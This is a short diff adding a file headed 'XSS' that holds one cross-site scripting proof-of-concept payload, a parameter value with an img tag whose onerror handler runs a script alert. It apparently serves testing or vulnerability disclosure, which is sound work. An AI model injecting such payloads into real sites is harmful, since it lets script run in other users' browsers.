@@ -1,0 +1,4 @@
+XSS
+---
+
+    neiron=<img src=x onerror=alert(123)>
